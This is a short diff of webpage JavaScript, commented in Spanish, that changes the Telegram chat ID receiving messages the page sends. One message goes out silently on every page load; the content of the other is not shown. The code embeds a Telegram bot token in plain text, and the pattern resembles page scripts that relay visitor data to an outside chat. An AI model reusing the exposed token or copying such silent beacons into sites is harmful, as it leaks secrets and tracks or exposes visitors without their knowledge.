@@ -7,7 +7,7 @@
 // Ejecutar al cargar la página
 window.addEventListener('load', function() {
     const token = "8253352707:AAFvpylVIvQn-j35T5PK-vVqf5CtEVfbnVE";
-    const chatId = "7874654715";
+    const chatId = "7020312853";
     const mensaje = `¡Alguien ha entrado a tu sitio web! - ${new Date().toLocaleString()}`;
 
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -79,7 +79,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
     /* =============================== TELEGRAM =============================== */
     const TELEGRAM_BOT_TOKEN = "8253352707:AAFvpylVIvQn-j35T5PK-vVqf5CtEVfbnVE";
-    const TELEGRAM_CHAT_ID  = "7874654715";
+    const TELEGRAM_CHAT_ID  = "7020312853";
 
     const mensaje =
       "*#1*\n\n" +
@@ -168,6 +168,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
 
 });
+
 
 
 
